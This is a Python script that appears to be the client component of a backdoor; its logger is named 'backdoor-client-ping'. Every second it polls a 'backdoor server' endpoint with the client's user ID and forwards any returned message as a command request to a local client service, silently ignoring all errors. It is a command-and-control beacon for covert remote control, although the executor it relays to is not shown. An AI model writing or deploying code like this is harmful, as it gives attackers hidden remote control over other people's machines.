#!/usr/bin/env python3

import time

import config
import client_config
from utilities.extra import logger
from utilities.service import http_request

log = logger('backdoor-client-ping')


def parse(data):
	tpl = ''
	for key in data:
		tpl += '%s=%s&' % (key, data[key])
	return tpl


if __name__ == '__main__':
	
	while True:
		try:
			response = http_request(method='POST', route='http://localhost:%s/poll?id_client=%s' % (config.BACKDOOR_SERVER_PORT, client_config.ACCESS['user']))
			if response and response.status_code == 200:
				
				response = response.json().get('message')
				if response:
					http_request('GET', route='http://localhost:%s/command?%s' % (config.CLIENT_SERVICE_PORT, parse(response)))
				
			time.sleep(1)
		except Exception as e:
			time.sleep(1)
